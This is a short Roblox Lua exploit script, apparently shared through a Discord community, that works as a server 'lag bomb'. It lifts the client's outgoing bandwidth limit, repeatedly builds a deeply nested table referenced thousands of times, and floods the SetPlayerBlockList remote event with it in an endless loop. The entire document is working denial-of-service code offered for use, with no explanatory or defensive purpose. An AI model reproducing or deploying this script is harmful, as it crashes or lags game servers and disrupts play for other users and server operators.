-- https://discord.gg/dVSFmJYDdS

while wait(0.6) do 
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end

local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}

table.insert(spammedtable, {})
z = spammedtable[1]

for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end

local calculatemax = getmaxvalue(tableincrease)
local maximum

if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end

for i = 1, maximum do
     table.insert(maintable, spammedtable)
end

for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end

bomb(250, 2)
end